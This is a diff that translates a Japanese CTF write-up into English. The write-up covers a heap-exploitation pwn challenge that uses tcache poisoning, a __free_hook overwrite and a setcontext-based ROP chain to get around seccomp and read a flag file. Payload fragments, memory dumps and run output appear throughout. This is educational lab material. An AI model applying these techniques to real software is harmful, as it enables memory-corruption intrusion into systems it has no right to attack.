@@ -17,7 +17,7 @@
 > -rwxrwxr-x 1 mito mito    17648 Apr  3 23:03 memory
 
 ### C code:
-以下は`Ghidra`を用いて`main`関数をデコンパイルした結果です。
+Below is the result of decompiling the `main` function using` Ghidra`.
 ```c
 void main(void)
 
@@ -57,16 +57,16 @@ void main(void)
 }
 ```
 ## Analysis:
-このバイナリでは下記の５つの機能があります。
-* `dread()`は、任意のアドレスのデータを8バイト表示する。
-* `dwrite()`は、任意のアドレスに8バイトのデータを書き込む。
-* `dallocate()`は、任意のサイズのchunkをmallocして、mallocしたサイズ-8のデータをヒープに書き込むことができる。nullで終端されない。
-* `dree()`は、`ptr`変数が指すchunk（最後にmallocしたチャンク）をフリーする。
-* `dview()`は、`ptr`変数が指すchunk（最後にmallocしたチャンク）のデータを表示する。
+This binary has the following five functions.
+* `dread ()` displays 8 bytes of data at any address.
+* `dwrite ()` writes 8 bytes of data to any address.
+* `dallocate ()` can malloc a chunk of any size and write malloced size -8 data in the heap. Not terminated with null.
+* `dree ()` frees the chunk (the last malloced chunk) pointed to by the `ptr` variable.
+* `dview ()` displays the data of the chunk (the last malloced chunk) pointed to by the `ptr` variable.
 
-ただし、`dread()`と`dwrite()`はどちらか１度しか使えません。
+However, `dread ()` and `dwrite ()` can only be used once.
 
-また最初に`sandbox`関数で`seccomp`の設定をしています。
+First, the `sandbox` function is used to set` seccomp`.
 ```c
 void sandbox(void)
 
@@ -96,9 +96,10 @@ void sandbox(void)
 }
 ```
 
-`seccomp-tools`の結果は下記になります。
+The result of `seccomp-tools` is as follows.
 
-`sys_read`, `sys_write`, `sys_open`, `sys_mprotect`, `sys_exit_group`以外のシステムコールを禁止しています。
+System calls other than `sys_read`,` sys_write`, `sys_open`,` sys_mprotect`, and `sys_exit_group` are prohibited.
+
 ```bash
 $ seccomp-tools dump ./memory
  line  CODE  JT   JF      K
@@ -117,8 +118,9 @@ $ seccomp-tools dump ./memory
  0011: 0x06 0x00 0x00 0x00000000  return KILL
 ```
 
-バイナリ(memory)を起動した時のフリーchunkの状態は下記になります。
-多くのchunkが最初からフリーされていることがわかります。
+The state of the free chunk when the binary (memory) is started is as follows.
+
+We can see that many chunks are free from the beginning.
 ```
 pwndbg> bins
 tcachebins
@@ -144,7 +146,7 @@ empty
 pwndbg> 
 ```
 
-`BSS`領域は下記になります。`count`変数と`ptr`変数のみです。
+The `BSS` area is as follows. Only `count` and` ptr` variables.
 ```
 pwndbg> x/80gx 0x555555558000
 0x555555558000:	0x0000000000000000	0x0000555555558008
@@ -158,16 +160,16 @@ pwndbg> x/80gx 0x555555558000
 ```
 
 ## Solution:
-Exploitのポイントは下記になります。
+The points of Exploit are as follows.
 
-* `dallocate()`でnull終端してないのでヒープアドレスのリークは簡単にできます。
-* `dwrite()`を使用して、`tcachebins`のリンクを置き換えることで、比較的容易にlibcアドレスの取得と`__free_hook`の書き換えができます。
-* `seccomp`でシステムコールが制限されているため`system`関数が使えません。
-* `mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];`と`setcontext`関数のROPガジェットを用いることでヒープメモリをスタックにしてROPにすることができます。
+* Heap address leaks are easy because they are not null-terminated with `dallocate()`.
+* We can easily get the libc address and rewrite the `__free_hook` by using` dwrite() `to replace the link in the` tcachebins`.
+* The `system` function cannot be used because the system call is restricted by` seccomp`.
+* We can use ROP by stacking heap memory using the the ROP gadget of `mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];` and the `setcontext` function.
 
-以下にExploitの手順について簡単に説明します。
+The following is a brief description of the Exploit procedure.
 
-ヒープアドレスのリークは`tcachebins`にリンクされているchunkのアドレスをリークできるので、0x10サイズのchunkを`dallocate()`して、"\n"のみデータとして書き込み、その後に`dview()`するとヒープアドレスの上位7バイトをリークできます。
+For heap address leaks, we can `dallocate ()` a 0x10 size chunk, write only "\n" as data, and then call the `dview()` function to leak the top 7 bytes of the heap address.
 ```bash
 $ ./memory
 Memory can be easily accessed !
@@ -190,10 +192,10 @@ data:
 6) exit
 >> 5
 
-�UUUU　　<- ヒープアドレスのリーク
+�UUUU　　<- Heap address leak
 ```
 
-最初の`tcachebins`の状態は下記になります。
+The state of the first `tcachebins` is as follows.
 ```
 pwndbg> bins
 tcachebins
@@ -204,14 +206,14 @@ tcachebins
 0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555a390 ◂— 0x0
 ```
 
-`dwrite()`を用いて0xf0の`tcachebin`のフリーchunkを`0x55555555a390`から`0x55555555aef0`に変更します。
+Use `dwrite()` to change the 0xf0 `tcachebin` free chunk from` 0x55555555a390` to `0x55555555aef0`.
 ```
-変更前の状態：0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555a390 ◂— 0x0
+State before change：0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555a390 ◂— 0x0
 　　　　　　　　　　　　　　　
-変更後の状態：0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555aef0 ◂— 0x0
+State after change： 0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555aef0 ◂— 0x0
 ```
 
-変更後のヒープメモリの状態は下記になります。
+The state of the heap memory after the change is as follows.
 ```
 0x55555555b070:	0x000055555555b1b0	0x000055555555ae90
 0x55555555b080:	0x0000000000000000	0x0000000000000000
@@ -224,7 +226,7 @@ tcachebins
 0x55555555b0e0:	0x0000000000000000	0x0000000000000000
 ```
 
-`0x000055555555aef0`近辺のメモリの状態は下記になっています。
+The memory status near `0x000055555555aef0` is as follows.
 ```
 0x55555555ae70:	0x000055555555acc0	0x000055555555b000
 0x55555555ae80:	0x0000000000000020	0x0000000000000070
@@ -233,15 +235,15 @@ tcachebins
 0x55555555aeb0:	0x000100010000ffff	0x0000000000000000
 0x55555555aec0:	0x00000000fd929108	0x0000000000000000
 0x55555555aed0:	0x000055555555b030	0x000055555555acf0
-0x55555555aee0:	0x0000000000000000	0x0000000000000000　--> 0xf1を書いて偽のchunkを作成する。
-0x55555555aef0:	0x0000000000000000	0x0000000000000071　--> このchunkのlibcアドレス(0x00007ffff7f8bc40)をリークさせる。
+0x55555555aee0:	0x0000000000000000	0x0000000000000000　--> Write 0xf1 to create a fake chunk.
+0x55555555aef0:	0x0000000000000000	0x0000000000000071　--> Leak the libc address (0x00007ffff7f8bc40) of this chunk.
 0x55555555af00:	0x00007ffff7f8bc40	0x000055555555ad50
 0x55555555af10:	0xffffffffffffffff	0xffffffffffffffff
 0x55555555af20:	0x0000000100000000	0x0000000000000000
 0x55555555af30:	0x0000000093507296	0x0000000000000000
 0x55555555af40:	0x0000000000000000	0x0000000000000000
 0x55555555af50:	0x0000000000000000	0x0000000000000000
-0x55555555af60:	0x0000000000000070	0x0000000000000080  --> この0x80サイズのchunkを書き換えて、__free_hookを書き換える。
+0x55555555af60:	0x0000000000000070	0x0000000000000080  --> Rewrite this 0x80 size chunk and rewrite __free_hook.
 0x55555555af70:	0x000055555555b220	0x0000555555559010
 0x55555555af80:	0x0000000000000003	0x0000000000000000
 0x55555555af90:	0x0000000000000003	0x0000000000000000
@@ -253,7 +255,7 @@ tcachebins
 0x55555555aff0:	0x000055555555b20a	0x0000000000000000
 ```
 
-下記を実行することで、libcのアドレス(`0x00007ffff7f8bc40`)を取得できます。
+We can get the libc address (`0x00007ffff7f8bc40`) by executing the following.
 ```python
 Alloc(0xe0, "\n")
 Alloc(0xe0, "A"*15+"\n")
@@ -275,12 +277,12 @@ View()
 0x55555555af80:	0x0000000000000003	0x0000000000000000
 ```
 
-下記を実行することで、0x80サイズの`tcachebins`に(`free_hook-0x10`)のデータを書き込むことができます。
+We can write the data of (`free_hook-0x10`) to the 0x80 size` tcachebins` by executing the following.
 ```python
 Free()
 Alloc(0xe0, b"A"*0x78+p64(0x81)+p64(free_hook-0x10))
 ```
-`tcachebins`に`__free_hook`のアドレスを書き込んだ状態は下記になります。
+The state where the address of `__free_hook` is written to` tcachebins` is as follows.
 ```
 pwndbg> bins
 tcachebins
@@ -290,9 +292,9 @@ tcachebins
 0xd0 [  5]: 0x55555555a190 —▸ 0x555555559e60 —▸ 0x555555559b30 —▸ 0x555555559800 —▸ 0x555555559370 ◂— 0x0
 ```
 
-`seccomp`でシステムコールが制限されているため`system`関数が使えません。そのためROPにする必要があるが、`setcontext`関数で使用するレジスタがlibc-2.31.soでは`rdx`に変更になっているため、`setcontext`関数を直接使用できません。
+The `system` function cannot be used because the system call is restricted by` seccomp`. Therefore, it needs to be ROP, but since the register used by the `setcontext` function has been changed to` rdx` in libc-2.31.so, the `setcontext` function cannot be used directly.
 
-以下は`setcontext`関数の抜粋です。
+The following is an excerpt from the `setcontext` function.
 ```
    0x00007ffff7df3f8d <+61>:	mov    rsp,QWORD PTR [rdx+0xa0]
    0x00007ffff7df3f94 <+68>:	mov    rbx,QWORD PTR [rdx+0x80]
@@ -305,20 +307,20 @@ tcachebins
    0x00007ffff7df3fbb <+107>:	je     0x7ffff7df4076 <setcontext+294>
 ```
 
-他には`push rdi; ... ;pop rsp;...;ret;`のROPガジェットを探したが、利用できるものはありませんでした。
+I searched for other `push rdi; ...; pop rsp; ...; ret;` ROP gadgets, but none were available.
 
-下記のサイトを確認したところ、`mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];`と`setcontext`関数のROPガジェットを利用することで、`rsp`レジスタにヒープのアドレスを設定できるので、ROPを利用できました。
+When I checked the following site, I was able to use ROP because I could set the address of the heap in the `rsp` register by using `mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];` and the ROP gadget of the` setcontext` function.
 https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/
 
-ROPでは、`./flag.txt`ファイルを`sys_open`して、`sys_read`、`sys_write`の順にシステムコールすることで、フラグファイルを読み出すことができます。
+In ROP, We can read the flag file by `sys_open` the` ./flag.txt` file and system-calling `sys_read` and` sys_write` in that order.
 
-下記は、`__free_hook`に`mov rdx, qword ptr [rdi + 8];...`のアドレスを設定した状態です。
+The following is the state where the address of `mov rdx, qword ptr [rdi + 8]; ...` is set in `__free_hook`.
 ```
 0x7ffff7f8de30 <fork_handlers+1552>:	0x0000000000000000	0x0000000000000000
 0x7ffff7f8de40 <__after_morecore_hook>:	0x000055555555b2c0	0x00007ffff7ef08b0
 ```
 
-下記はヒープにROPのコードを書き込んだ状態です。
+The following is the state where the ROP code is written in the heap area.
 ```
 0x55555555b290:	0x0000000000000000	0x0000000000000021
 0x55555555b2a0:	0x000055555555a770	0x0000555555559010
@@ -350,7 +352,7 @@ ROPでは、`./flag.txt`ファイルを`sys_open`して、`sys_read`、`sys_writ
 ```
 
 ## Exploit code:
-Exploitコードは下記になります。
+The Exploit code is below.
 ```python
 from pwn import *
 
@@ -476,7 +478,7 @@ s.interactive()
 ```
 
 ## Results:
-実行結果は下記になります。
+The execution result is as follows.
 ```bash
 mito@ubuntu:~/CTF/Securinets_CTF_Quals_2022/Pwn_Memory$ python3 solve.py r
 [*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_Memory/memory'
@@ -501,6 +503,6 @@ Securinets{397b5541d6dacf89123c5a24eea45cb7cc526dade67d4a70}
 ```
 
 ## Reference:
-参考文献は下記になります。Midasさん、ありがとうございます！
+References are below. Thank you, Midas!
 
 https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/
